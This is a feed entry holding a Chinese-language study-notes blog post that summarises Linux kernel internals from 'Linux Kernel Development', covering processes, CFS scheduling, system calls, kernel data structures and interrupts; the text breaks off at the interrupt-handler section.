    <updated>2020-05-08T18:26:22.575Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux内核设计与实现"><a href="#Linux内核设计与实现" class="headerlink" title="Linux内核设计与实现"></a>Linux内核设计与实现</h1><h2 id="操作系统和内核简介"><a href="#操作系统和内核简介" class="headerlink" title="操作系统和内核简介"></a>操作系统和内核简介</h2><p>处理器上任何指定时间点上的活动必然概况为下列三者之一（当CPU空闲时，相当于运行一个空间程，运行于内核空间）：</p><p><img src="./img/1585145258.jpg" alt="应用程序、内核和硬件的关系"></p><h3 id="内核开发特点"><a href="#内核开发特点" class="headerlink" title="内核开发特点"></a>内核开发特点</h3><ol><li>无libc库也无标准头文件</li><li>没有内存保护机制</li><li>不要轻易在内核中使用浮点数</li><li>容积小而固定的栈</li><li>同步和并发</li></ol><h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>进程就是处于执行器的程序，并包括其资源（如打开的文件，挂起的信号，内核内部数据，处理器状态，一个或多个具有内存映射的内存地址空间以及一个或一个的执行线程，还有数据段等）。</p><p>执行线程，简称线程。每个线程都拥有一个独立的程序计算器、进程栈和一组进程寄存器。内核调度的对象是线程而非进程。</p><p>进程是处于执行期的程序以及相关的资源的总称。</p><h3 id="进程描述符及任务结构"><a href="#进程描述符及任务结构" class="headerlink" title="进程描述符及任务结构"></a>进程描述符及任务结构</h3><p>内核把进程的列表存放在叫做任务队列的双向循环链表中。链表中的每一项都是类型为task_struct、称为进程描述符的结构（定义在&lt;linux/sched.h&gt;文件中）</p><h4 id="分配进程描述符"><a href="#分配进程描述符" class="headerlink" title="分配进程描述符"></a>分配进程描述符</h4><p>linux通过slab分配器分配task_struct结构。</p><p>struct thread_info在文件&lt;asm/thread_info.h&gt;中定义。</p><p>内核通过一个唯一的进程标识值或PID来标识每个进程。</p><p>系统管理员可通过修改/proc/sys/kernel/pid_max来提高进程最大数目的上限。</p><h5 id="进程状态"><a href="#进程状态" class="headerlink" title="进程状态"></a>进程状态</h5><p>进程描述符中的state域描述了进程的当前状态。每个进程都必然处于五种进程状态中的一种：</p><p>TASK_RUNNING（运行）——进程是可执行的；它或正在执行，或在运行队列中等待执行。这是进程在用户控件中执行的唯一可能状态；该状态也可以应用到内核空间中正在执行的进程。</p><p>TASK_INTERRUPTLBLE（可中断）——进程正在睡眠（即阻塞），等待某些条件的达成。一旦这些条件达成，内核就会把进程状态设置为运行。处于此状态的进程也会因为接收到信号而提前被唤醒并随时准备投入运行。</p><p>TASK_UNINTERRUPTLBLE（不可中断）——除了就算是接收到信号也不会被唤醒或准备投入运行外，这个状态与可打断状态相同。通常在进程必须在等待时不受干扰或等待事件很快就会发生时出现。</p><p>_TASK_TRACED——被其他进程跟踪的进程，例如通过ptrace对调试程序进行跟踪。</p><p>_TASK_STOPPED（停止）——进程停止执行；进程没有投入运行也不能投入运行。通常这种状态发生在接收到SIGSTOP、SIGTSTP、SIGTTIN、SIGTTOU等信号时。此外，在调试期间接收到任何信号，都会使进程进入这种状态。</p><p><img src="./img/1585215912.png" alt="进程状态转化"></p><h5 id="设置当前进程状态"><a href="#设置当前进程状态" class="headerlink" title="设置当前进程状态"></a>设置当前进程状态</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set_task_state(task, state);</span><br><span class="line">set_current_state(state);<span class="comment">//等同于set_task_state(current, state);</span></span><br></pre></td></tr></table></figure><h5 id="进程上下文"><a href="#进程上下文" class="headerlink" title="进程上下文"></a>进程上下文</h5><p>即当一个程序执行了系统调用或者触发了某个异常，它就陷入了内核空间。此时，我们称内核“代表进程执行”并处于进程上下文中。在此上下文中current宏是有效的。除非在此间隙有更高优先级的进程需要执行并由调度器做出了相应调整，否则在内核退出时，程序恢复，在用户空间会继续执行。</p><p>系统调用和异常处理程序是对内核明确定义的接口。进程只有通过这些接口才能陷入内核执行——对内核的所有访问都必须通过这些接口。</p><h3 id="进程创建"><a href="#进程创建" class="headerlink" title="进程创建"></a>进程创建</h3><h4 id="fork-与exec"><a href="#fork-与exec" class="headerlink" title="fork()与exec()"></a>fork()与exec()</h4><p>fork()通过拷贝当前进程创建一个子进程。子进程与父进程的区别仅仅在于PID、PPID和某些资源和统计量。exec()函数负责读取可执行文件并将其载入地址空间开始运行。</p><h4 id="写时拷贝"><a href="#写时拷贝" class="headerlink" title="写时拷贝"></a>写时拷贝</h4><p>Linux的fork()使用写时拷贝页实现。写时拷贝是一种可以推迟甚至免除拷贝数据的技术。内核此时并不复制整个进程地址空间，而是让父进程和子进程共享同一个拷贝。</p><p>只有在需要写入时，数据才会被复制，从而使各个进程拥有各自的拷贝。</p><h4 id="fork"><a href="#fork" class="headerlink" title="fork()"></a>fork()</h4><p>Linux通过clone()系统调用实现fork()。这个调用通过一系列的参数标志来指明父、子进程需要的共享资源。fork()、vfork()、和__clone()库函数都根据各自需要的参数标志去调用clone()，然后由clone()去调用do_fork()。</p><p>do_fork的定义在kernel/fork.c文件中。该函数调用copy_process()函数，然后让进程开始运行。copy_process()函数的工作如下：</p><ol><li>调用dup_task_struct()为新进程创建一个内核栈、thread_info结构和task_struct，这些值与当前进程的值相同。</li><li>检查并确保新创建的这个子进程后，当前用户所拥有的进程数目没有超出给它分配的资源的限制。</li><li>子进程中的进程描述符内的许多成员都要被清0或设为初始值。主要是统计信息。task_struct中的大多数数据都依然未被修改。</li><li>子进程的状态被设置为TASK_UNINTERRUPTLBLE，以保证它不会投入运行。</li><li>copy_process()调用copy_flags()以更新task_struct的flags成员。表明进程是否拥有超级用户权限的PF_SUPERPRIV标志被清0.表明进程还没有调用exec()函数的PF_FORKNOEXEC标志被设置。</li><li>调用alloc_pid()为新进程分配一个有效的PID。</li><li>根据传递给clone()的参数标志，copy_process()拷贝或共享打开的文件、文件系统信息、信号处理函数、进程地址空间和命名空间等。</li><li>最后，copy_process()做扫尾工作并返回一个指向子进程的指针。</li></ol><p>再回到do_fork()函数，如果copy_process()函数成功返回，新创建的子进程被唤醒并让其投入运行，内核有意选择子进程先执行。（因为一般子进程都会马上调用exec()函数，这样可以避免写时拷贝的额外开销。）</p><h4 id="vfork"><a href="#vfork" class="headerlink" title="vfork()"></a>vfork()</h4><p>除了不拷贝父进程的页表项外，vfork()系统调用和fork()的功能相同。</p><p>vfork()系统调用的实现是通过向clone()系统调用传递一个特殊标志来进行的。</p><ol><li>在调用copy_process()时，task_struct的vfork_done成员被设置为NULL。</li><li>在执行do_fork()时，如果给定特别标志，则vfork_done会指向一个特定地址。</li><li>子进程先开始执行后，父进程不是马上恢复执行，而是一直等到，直到子进程通过vfork_done指针向他发送信号。</li><li>在调用mm_release()时，该函数用于进程退出内存地址空间，并且检查vfork_done是否为空，如果不为空，则会向父进程发送信号。</li><li>回到do_fork()，父进程醒来并返回。</li></ol><h3 id="线程在Linux中的实现"><a href="#线程在Linux中的实现" class="headerlink" title="线程在Linux中的实现"></a>线程在Linux中的实现</h3><h4 id="创建线程"><a href="#创建线程" class="headerlink" title="创建线程"></a>创建线程</h4><p>一个普通的fork()的实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clone(SIGCHLD, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>其中SIGCHLD为参数标志，在&lt;linux/sched.h&gt;中定义了clone()用到的参数标志及其作用。</p><h4 id="内核线程"><a href="#内核线程" class="headerlink" title="内核线程"></a>内核线程</h4><p>内核线程——独立运行在内核空间的标准线程。内核线程和普通的进程间的区别在于内核线程没有独立的地址空间，仅在内核空间运行，从来不切换到用户空间去。</p><p>内核线程只能由其他内核线程创建。内核是通过从kthreadd内核进程中衍生出所有新的内核线程来自动处理这一点的。在&lt;linux/kthread.h&gt;中申明有接口。从现有内核线程中创建一个新的内核线程的方法如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct task_struct *kthread_create(int (*threadfn)(void *data)), void *data, const char namefmt[], ...)</span><br></pre></td></tr></table></figure><p>新的任务是由kthread内核进程通过clone()系统调用而创建的。新的进程将允许threadfn函数，给其传递的参数为data。进程名为namefmt，接受可变参数列表类似于printf()的格式化参数。新创建的进程处于不可运行状态，需通过wake_upprocess()明确唤醒它。</p><p>创建一个进程并让它运行起来，可以通过调用kthread_run()来达到：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct task_struct *kthread_run(int (*threadfn)(void *data)), void *data, const char namefmt[], ...)</span><br></pre></td></tr></table></figure><p>该例程以宏实现，仅简单地调用了kthread_create()和wake_up_process()。</p><p>内核线程启动后就一直运行知道调用do_exit()退出，或者内核的其他部分调用kthread_stop()退出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kthread_stop</span><span class="params">(struct task_struct *k)</span></span>;</span><br></pre></td></tr></table></figure><p>其中k为kthread_create返回的task_struct结构。</p><h4 id="进程终结"><a href="#进程终结" class="headerlink" title="进程终结"></a>进程终结</h4><p>一般来说，进程的析构是自身引起的。它发生在进程调用exit()系统调用时（既可能显式调用这个系统调用，也可能隐式地从某个程序的主函数返回）。当进程接受到它既不能处理也不能忽略的信号或异常时，它还可能被动终结。但不管如何终结的，任务大部分都要靠do_exit()（定义于&lt;kernel/exit.c&gt;中）来完成：</p><ol><li>将task_struct中的标志成员设置为PF_EXITNG。</li><li>调用del_timer_sync()删除任一内核定时器。根据返回结果，确保没有定时器在排队，也没有定时器处理程序在运行。</li><li>如果BSD的进程记账功能是开启的，do_exit()调用acct_update_integrals()来输出记账信息。</li><li>然后调用exit_mm()函数释放进程占用的mm_struct，如果没有别的进程使用它们（即没有被共享），就彻底释放。</li><li>接下来调用sem_exit()函数。如果进程排队等候IPC信号，则离开队列。</li><li>调用exit_files()和exit_fs()，以分别递减文件描述符、文件系统数据的引用计数。若其中某个引用计数的数值降为0，那么就代表没有进程在使用相应的资源，此时可以释放。</li><li>接着把存放在task_struct的exit_code成员中的任务退出代码置为exit()提供的退出代码，或者去完成任何其他由内核机制规定的退出动作。退出代码存放在这里供父进程随时检索。</li><li>调用exit_notify()向父进程发送信号，给子进程重新找养父，养父为线程组中的其他线程或者为init进程，并把进程状态（存放在task_struct结构的exit_state中）设置成EXIT_ZOMBIE。</li><li>do_exit()调用schedule()切换到新的进程（因为EXIT_ZOMBIE状态的进程不会再被调度，所以这是进程所执行的最后一段代码。do_exit()永不返回）。</li></ol><p>至此，进程所占用的所有内存就是内核栈、thread_info结构和task_struct结构。此时进程存在的唯一目的就是向它的父进程提供信息。父进程检索到信息后，或者通知内核那是无关信息后，由进程所持有的剩余内存被释放，归还给系统使用。</p><h5 id="删除进程描述符"><a href="#删除进程描述符" class="headerlink" title="删除进程描述符"></a>删除进程描述符</h5><p>进程终结时所需的清理工作和进程描述符的删除被分开执行。</p><p>wait()这一族函数都是通过唯一的一个系统调用wait4()来实现的。其标准动作是挂起调用它的进程，直到其中一个子进程退出，此时函数会返回该子进程的PID。此时，调用该函数时提供的指针会包含子函数退出时的退出代码。</p><p>当最终需要释放进程描述符时，release_task()会被调用：</p><ol><li>它调用__exit_signal()，该函数调用_unhash_process()，后者又调用detach_pid()从pidhash上删除该进程，同时也要从任务列表中删除该进程。</li><li>__exit_signal()释放目前僵死进程所使用是所有剩余资源，并进行最终统计和记录。</li><li>如果这个进程是线程组最后一个进程，并且领头进程以及死掉，那么release_task()就要通知僵死的领头进程父进程。</li><li>release_task()调用put_task_struct()释放进程内核栈和thread_info结构所占的页，并释放task_struct所占用的slab高速缓存。</li></ol><h5 id="孤儿进程的解决"><a href="#孤儿进程的解决" class="headerlink" title="孤儿进程的解决"></a>孤儿进程的解决</h5><p>对于孤儿进程退出时处于僵死状态白白浪费内存放问题，解决方法是给子进程在当前线程组内找一个线程作为父亲，如果不行，就让init做它们的父进程。</p><ol><li>在do_exit()中会调用exi_notify()，该函数会调用forget_original_parent()，而后者会调用find_new_reaper来执行寻父过程。</li><li>当找到合适的养父进程时，只需要遍历所有子进程并为它们设置新的父进程。</li><li>然后调用ptrace_exit_finish()，同样进行新的寻父进程，不过这次是给ptraced的子进程寻找父亲。</li></ol><p>一旦系统为进程找到并设置了新的父进程，就不会再出现驻留僵死进程的情况。init进程会例行调用wait()来检查其子进程，清除所有与其相关的僵死进程。</p><h2 id="进程调度"><a href="#进程调度" class="headerlink" title="进程调度"></a>进程调度</h2><h3 id="多任务"><a href="#多任务" class="headerlink" title="多任务"></a>多任务</h3><p>多任务系统可以划分为两类：非抢占式多任务和抢占式多任务。</p><p>Linux提供了抢占式多任务模式。此模式下，由调度程序来决定什么时候停止一个进程的运行，以便其他进程能够得到执行的机会。这个强制的挂起动作叫做抢占。</p><p>在非抢占式多任务模式下，除非进程自己主动退出，否则它会一直执行。进程主动挂起自己的操作称为让步。</p><h3 id="Linux的进程调度"><a href="#Linux的进程调度" class="headerlink" title="Linux的进程调度"></a>Linux的进程调度</h3><p>O(l)调度器</p><ol><li>静态时间片算法</li><li>运行队列</li><li>反转楼梯最后期限调度算法(RSDL)</li><li>完全公平调度算法(CFS)</li></ol><h3 id="策略"><a href="#策略" class="headerlink" title="策略"></a>策略</h3><h4 id="I-O消耗性和处理器消耗型进程"><a href="#I-O消耗性和处理器消耗型进程" class="headerlink" title="I/O消耗性和处理器消耗型进程"></a>I/O消耗性和处理器消耗型进程</h4><p>I/O消耗型进程指进程的大部分时间用来提交I/O请求或者等待I/O请求。这样的进程经常处于可运行状态，但通常都是运行短短一会儿。</p><p>处理器消耗型进程大部分时间都在执行代码上，除非被抢占，否则它们通常都一直不停地运行，因为它们没有太多的I/O需求。对于这类进程，调度策略往往是尽量降低它们的调度频率，而延长其运行时间。</p><p>调度策略通常要在两个矛盾的目标中间寻求平衡：进程响应迅速和最大系统利用率。Linux为了保证交互应用和桌面系统的性能，所以对进程的响应做了优化，更倾向于优先调度I/O消耗型进程。</p><h4 id="进程优化级"><a href="#进程优化级" class="headerlink" title="进程优化级"></a>进程优化级</h4><p>Linux采用两种不同的优先级范围：</p><ol><li>第一种是nice值，范围从-20到+19，默认值为0，越大的nice值意味着更低的优先级。在Linux中，nice值代表时间片的比例。可以通过ps -el命令查看，NI值即为nice值。</li><li>第二种是实时优先级，默认情况下变化范围是0到99。越高的实时优化级意味着进程优先级越高。任何实时进程的优先级都高于普通的进程。可用ps -eo state,uid,pid,ppid,rtprio,time,comm查看，其中rtprio为实时优先级，若为”-“,则说明不是实时进程。</li></ol><h4 id="时间片"><a href="#时间片" class="headerlink" title="时间片"></a>时间片</h4><p>时间片是一个数值，它表明进程在被抢占前所能持续运行的时间。</p><p>Linux下，是否要将一个进程立刻投入运行，是完全由进程优先级和是否有时间片决定的。在新的CFS调度器中，其抢占时机取决于心底 可运行程序消耗了多少处理器使用比。如果消耗的使用比比当前进程小，则新进程立刻投入运行。</p><h4 id="调度策略活动"><a href="#调度策略活动" class="headerlink" title="调度策略活动"></a>调度策略活动</h4><h3 id="Linux调度算法"><a href="#Linux调度算法" class="headerlink" title="Linux调度算法"></a>Linux调度算法</h3><h4 id="调度器类"><a href="#调度器类" class="headerlink" title="调度器类"></a>调度器类</h4><p>linux调度器是以模块方式提供的。这种模块化结构被称为调度器类，它允许多种不同的可动态添加的调度算法并存，调度属于自己范畴的进程。每个调度器都有一个优先级，基础的调度器代码定义在kernel/sched.c文件中。它会安装优先级顺序遍历调度类，拥有一个可执行进程的最高优先级的调度器类生出，去选择下面要执行的那个程序。</p><p>完全公平调度(CFS)是一个针对普通进程的调度类，在Linux中称为SCHED_NORMAL，定义在kernel/sched_fair.c中。</p><h4 id="公平调度"><a href="#公平调度" class="headerlink" title="公平调度"></a>公平调度</h4><p>CFS的出发点基于一个简单的理念：进程调度的效果应如同系统具备一个理想中的完美多任务处理器。在这种系统中，每个进程将能获得1/n的处理器时间。同时，完美可以调度给它们无限小的时间周期，所以在任何可测量周期内，我们给予n个进程中每个进程同样多的运行时间。</p><p>CFS允许每个进程运行一段时间、循环轮转、选择运行时间最少的程序作为下一个运行程序。nice值在CFS中被作为进程获得的处理器运行比重。</p><p>CFS引入了每个进程获得的时间片底线，这个底线称为最小粒度。默认情况下这个值是1ms。</p><h3 id="Linux调度的实现"><a href="#Linux调度的实现" class="headerlink" title="Linux调度的实现"></a>Linux调度的实现</h3><h4 id="时间记账"><a href="#时间记账" class="headerlink" title="时间记账"></a>时间记账</h4><h5 id="调度器实体结构"><a href="#调度器实体结构" class="headerlink" title="调度器实体结构"></a>调度器实体结构</h5><p>CFS使用调度器实体结构（定义在&lt;linux/sched.h&gt;的struct_sched_entity中）来追踪进程运行记账。</p><p>调度器实体结构作为一个名为se的成员变量，嵌入在进程描述符内。</p><h5 id="虚拟实时"><a href="#虚拟实时" class="headerlink" title="虚拟实时"></a>虚拟实时</h5><p>vruntime变量存放进程的虚拟运行时间，该运行时间（花在运行商的时间和）的计算是经过了所有可运行进程总数的标准化。虚拟时间是以ns为单位的。CFS用vruntime变量来记录一个程序到底运行了多长时间以及它还应该再运行多久。</p><p>在kernel/sched_fair.c中的update_curr()函数实现了该记账功能。</p><p>update_curr()计算了当前进程的执行时间，并且将其存放在变量delta_exec中。然后又将运行时间传递给了__update_curr()，由后者再根据当前可运行进程总数对运行时间进程加权计算。最终将上述的权重值与当前运行进程的vruntime相加。</p><p>update_curr()是由系统定时器周期性调用的。</p><h4 id="进程选择"><a href="#进程选择" class="headerlink" title="进程选择"></a>进程选择</h4><p>CFS调度算法的核心：选择具有最小vruntime的任务。</p><p>CFS使用红黑树来组织可运行进程队列，并利用其迅速找到最小vruntime值的进程。</p><h5 id="挑选下一个任务"><a href="#挑选下一个任务" class="headerlink" title="挑选下一个任务"></a>挑选下一个任务</h5><p>实现这一过程的函数是__pick_next_entity()，它定义在kernel/sched_fair.c中。</p><h5 id="向树中加入进程"><a href="#向树中加入进程" class="headerlink" title="向树中加入进程"></a>向树中加入进程</h5><p>CFS将进程加入红黑树以及缓存最左叶子节点的过程发送在进程变为可执行状态（被唤醒）或者是通过fork()调用第一次创建进程时。</p><p>enqueue_entity()函数实现了这一目的。该函数更新运行时间和其他一些统计数据，然后调用__enqueue_entity()进程繁重的插入操作，把数据项真正插入到红黑树中。</p><h5 id="从树中删除进程"><a href="#从树中删除进程" class="headerlink" title="从树中删除进程"></a>从树中删除进程</h5><p>删除动作发送在进程堵塞或者终止时。</p><p>dequeue_entity()函数实现了这一目的。和添加进程一样，实际工作是由辅助函数__dequeue_entity()完成的。</p><h4 id="调度器入口"><a href="#调度器入口" class="headerlink" title="调度器入口"></a>调度器入口</h4><p>进程调度的主要入口点是函数schedule()，定义在kernel/sched.c中。schedule()通常需要和一个具体的调度类相关联。该函数唯一重要的事是调用pick_next_task()，用以优先级为序，从高到低，依次检查每一个调度类，并且从最高优先级的调度类中，选择最高优先级的进程。</p><h4 id="睡眠和唤醒"><a href="#睡眠和唤醒" class="headerlink" title="睡眠和唤醒"></a>睡眠和唤醒</h4><p>休眠（被堵塞）的进程处于一个特殊的不可执行状态。内核对于进程休眠的操作如下：进程把自己标记成休眠状态，从可执行红黑树中移出，放入等待队列，然后调用schedule()选择和执行一个其他进程。唤醒的过程则恰好相反：进程被设置为可执行状态，然后再从等待队列中移到可执行红黑树中。</p><h5 id="等待队列"><a href="#等待队列" class="headerlink" title="等待队列"></a>等待队列</h5><p>休眠通过等待队列进行处理。等待队列是由等待某些事件发生的进程组成的简单链表。内核用wake_queue_head_t来代表等待队列。</p><p>等待队列可以通过DECLARE_WAITQUEU()静态创建，也可以由init_waitqueue_head()动态创建。</p><p>进程通过执行以下步骤将自己加入到一个等待队列中：</p><ol><li>调用宏DEFINE_WAIT()创建一个等待队列的项。</li><li>调用add_wait_queue()把自己加入到队列中。该队列会在进程等待的条件满足时唤醒它。</li><li>调用prepare_to_wait()方法将进程的装填变更为TASK_INTERRUPTIBLE或TASK_UNINTERRUPTIBLE。而且该函数如果有必要的话会将进程加回到等待队列，这是在接下来循环遍历中需要的。</li><li>如果状态被设置为TASK_INTERRUPTIBLE，则信号唤醒进程。</li><li>当进程被唤醒时，它会再次检查条件是否为真。。如果是，它就退出循环；如果不是，它再次调用schedule()并一直重复这步操作。</li><li>当条件满足后，进程将自己设置为TASK_RUNNING并调用finish_wait()方法把自己移出等待队列。</li></ol><p>函数inotify_read()位于fs/notify/inotify/inotify_user.c中，负责从通知文件描述符中读取信息。</p><h5 id="唤醒"><a href="#唤醒" class="headerlink" title="唤醒"></a>唤醒</h5><p>唤醒操作通过函数wake_up()进行，它会唤醒指定的等待队列上的所有进程。它调用函数try_to_wake_up()，该函数负责将进程设置为TASK_RUNNING状态，调用enqueue_task()将进程放入红黑树，若唤醒的进程优先级比当前正在执行的进程优先级高，还要设置need_resched标志。</p><p><img src="./img/1585640196.png" alt="休眠与唤醒"></p><h3 id="抢占和上下文切换"><a href="#抢占和上下文切换" class="headerlink" title="抢占和上下文切换"></a>抢占和上下文切换</h3><p>上下文奇幻，也就是从一个可执行进程切换到另一个可执行进程，由定义在kernel/sched.c中的context_switch()函数负责。它完成了两项基本工作：</p><ol><li>调用声明在&lt;asm/mmu_context.h&gt;中的switch_mm()，该函数负责把虚拟内存从上一个进程映射切换到新进程中。</li><li>调用声明在&lt;asm/system.h&gt;中的switch_to()，该函数负责从上一个进程的处理器状态切换到新进程的处理器状态。包括保存、恢复栈信息和寄存器信息，还有其他任何与体系结构相关的状态信息，都必须以每个进程为对象进行管理和保存。</li></ol><p>内核提供了一个need_resched标志来表明是否需要重新执行一次调度。当某个进程应该被抢占时，scheduler_tick()就会设置这个标志：当一个优先级高的进程进入可执行状态的时候，try_to_wake_up()也会设置这个标志，内核检查该标志，确认其被设置，调用schedule()来切换到一个新的进程。</p><p>在返回用户空间以及从中断返回的时候，内核也会检查need_resched标志。如果已被设置，内核会在继续执行之前调用调度程序。</p><h4 id="用户抢占"><a href="#用户抢占" class="headerlink" title="用户抢占"></a>用户抢占</h4><p>内核即将返回用户空间的时候，如果need_resched标志被设置，会导致schedule()被调用，此时就会发生用户抢占。用户抢占发生在以下情况时：</p><ul><li>从系统调用返回用户空间时。</li><li>从中断处理程序返回用户空间时。</li></ul><p>从中断处理程序或者系统系统调用返回的返回路径都是跟体系结构相关的，在entry.s（此文件包含内核入口部分以及内核退出部分的程序）文件中通过汇编语言来实现。</p><h4 id="内核抢占"><a href="#内核抢占" class="headerlink" title="内核抢占"></a>内核抢占</h4><p>Linux完整地支持内核抢占。只要重新调度是安全的（即没有持有锁），内核可以在任何时间抢占正在执行的任务。</p><p>锁是非抢占区域的标志。当使用锁的时候，thread_info中的preempt_count计数器（初始值为0）数值加1，释放锁的时候数值减1。当数值为0时，内核就可以执行抢占。</p><p>如果内核中的进程被阻塞了，或者它显式地调用了schedule()，内核抢占也会显式地发生。</p><p>内核抢占会发生在：</p><ul><li>中断处理程序正在执行，且返回内核空间之前。</li><li>内核代码再一次具有可抢占性的时候。</li><li>如果内核中的任务显式地调用schedule()。</li><li>如果内核中的任务阻塞。</li></ul><h3 id="实时调度策略"><a href="#实时调度策略" class="headerlink" title="实时调度策略"></a>实时调度策略</h3><p>Linux提供了两种实时调度策略：SCHED_FIFO和SCHED_RR。普通的、非实时的调度策略是SCHED_NORMAL。具体实现定义在kernel/sched_rt.c中。</p><p>SCHED_FIFO实现了简单的、先入先出的调度算法。处于可运行状态的SCHED_FIFO级进程会比任何SCHED_NORMAL级的进程都先得到调度。一旦一个SCHED_FIFO进程处于可执行状态，就会一直执行，知道它自己受阻塞或显式地释放处理器为止。只有更高优先级的SCHED_FIFO或SCHED_RR任务才可以抢占它。若有两个或多个同优先级的SCHED_FIFO级进程，它们会轮流执行，但依然只有它们愿意让出处理器时才会退出。</p><p>SCHED_RR与SCHED_FIFO大体相同。但SCHED_RR级的进程在耗尽事先分配给他的时间后就不能继续执行了。</p><p>实时优先级范围从0到MAX_RT_PRIO减1。SCHED_NORMAL级进程的nice值共享了这个取值空间：从MAX_RT_PRIO到MAX_RT_PRIO+40。即nice从-20到+19直接对应100到139的实时优先级范围。</p><h3 id="与调度相关的系统调用"><a href="#与调度相关的系统调用" class="headerlink" title="与调度相关的系统调用"></a>与调度相关的系统调用</h3><h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><h3 id="与内核通信"><a href="#与内核通信" class="headerlink" title="与内核通信"></a>与内核通信</h3><h3 id="API、POSIX和C库"><a href="#API、POSIX和C库" class="headerlink" title="API、POSIX和C库"></a>API、POSIX和C库</h3><h3 id="系统调用-1"><a href="#系统调用-1" class="headerlink" title="系统调用"></a>系统调用</h3><h4 id="系统调用号"><a href="#系统调用号" class="headerlink" title="系统调用号"></a>系统调用号</h4><p>内核记录了系统调用表中所有已注册过的系统调用的列表，存储在sys_call_talbe中。x86-64体系中，定义于arch/i386/kernel/syscall_64.c中。这个表位每一个有效的系统调用指定了唯一的系统调用号。</p><h4 id="系统调用的性能"><a href="#系统调用的性能" class="headerlink" title="系统调用的性能"></a>系统调用的性能</h4><h3 id="系统调用处理程序"><a href="#系统调用处理程序" class="headerlink" title="系统调用处理程序"></a>系统调用处理程序</h3><p>应用程序以某种方式通知系统，从而使系统切换到内核态，从而内核代表应用程序在内核空间执行系统调用。</p><p>通知内核机制是通过软中断实现的：通过引发一个异常来促使系统切换到内核态去执行异常处理程序。此时的异常处理程序即为系统调用处理程序。</p><h4 id="指定恰当的系统调用"><a href="#指定恰当的系统调用" class="headerlink" title="指定恰当的系统调用"></a>指定恰当的系统调用</h4><p>在x86上，系统调用号是通过eax寄存器传递给内核的。system_call()函数通过将给定的系统调用号与NR_syscalls做笔记来检查其有效性。如果大于或等于NR_syscalls，该函数返回-ENOSYS。否则，就执行相应的系统调用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call *sys_call_table(,%rax,8);</span><br></pre></td></tr></table></figure><p><img src="./img/1585746738.jpg" alt="调用系统调用处理程序以执行一个系统调用"></p><h4 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h4><h3 id="系统调用的实现"><a href="#系统调用的实现" class="headerlink" title="系统调用的实现"></a>系统调用的实现</h3><h3 id="系统调用上下文"><a href="#系统调用上下文" class="headerlink" title="系统调用上下文"></a>系统调用上下文</h3><p>内核在执行系统调用的时候处于进程上下文。current指针指向当前任务，即引发系统调用的进程。</p><p>在进程上下文中，内核可以休眠并且可以被抢占。</p><h5 id="绑定一个系统调用的步骤"><a href="#绑定一个系统调用的步骤" class="headerlink" title="绑定一个系统调用的步骤"></a>绑定一个系统调用的步骤</h5><ol><li>首先，在系统调用表的最后加入一个表项（计数从0开始）。每种支持该系统调用的硬件体系都必须做这样的工作。</li><li>对于所支持的各种体系结构，系统调用号都必须定义于&lt;asm/unistd.h&gt;中。</li><li>系统调用必须被编译进内核映像（不能被编译成模块）。即放入kernel/下的一个相关文件中就可以了。</li></ol><h2 id="内核数据结构"><a href="#内核数据结构" class="headerlink" title="内核数据结构"></a>内核数据结构</h2><h3 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h3><p>单向链表和双向链表</p><p>环形链表</p><p>Linux内核的标准链表就是采用环形双向链表形式实现的。</p><p>定义于&lt;linux/list.h&gt;</p><h3 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h3><p>队列为FIFO。</p><p>定义于&lt;linux/kfifo.h&gt;</p><h3 id="映射"><a href="#映射" class="headerlink" title="映射"></a>映射</h3><p>Linux内核提供了简单、有效的映射数据结构，但并非一个通用的映射，因为它的目标是：映射一个唯一的标识数(UID)到一个指针。</p><h3 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h3><h4 id="二叉搜索树"><a href="#二叉搜索树" class="headerlink" title="二叉搜索树"></a>二叉搜索树</h4><h4 id="自平衡二叉搜索树"><a href="#自平衡二叉搜索树" class="headerlink" title="自平衡二叉搜索树"></a>自平衡二叉搜索树</h4><h5 id="红黑树"><a href="#红黑树" class="headerlink" title="红黑树"></a>红黑树</h5><h5 id="rbtree"><a href="#rbtree" class="headerlink" title="rbtree"></a>rbtree</h5><p>Linux实现的红黑树叫rbtree，定义于lib/rbtree.c中，声明在&lt;linux/rbtree.h&gt;中。</p><h3 id="算法复杂度"><a href="#算法复杂度" class="headerlink" title="算法复杂度"></a>算法复杂度</h3><h2 id="中断和中断处理"><a href="#中断和中断处理" class="headerlink" title="中断和中断处理"></a>中断和中断处理</h2><h3 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h3><p>中断使得硬件得以发出通知给处理器。</p><p>中断本质上是一种特殊的电信号，由硬件设备发向处理器。处理器接收到中断后，会马上向操作系统反映此信号的到来，然后就由操作系统负责处理这些新到来的数据。内核随时可能因为新到来的中断而被打断。</p><p>中断值通常被称为中断请求（IRQ）线。每个IRQ线都会被关联一个数值量。</p><h5 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h5><p>异常与中断不同，它在产生时必须考虑与处理器时钟同步。实际上，异常也常常称为同步中断。许多处理器体系结构处理异常与处理中断的方式类似，因此内核对它们的处理也很类似。</p><p>在x86体系结构上，通过软中断实现系统调用，那就是陷入内存，然后引起一种特殊的异常——系统调用处理程序异常。</p><h3 id="中断处理程序"><a href="#中断处理程序" class="headerlink" 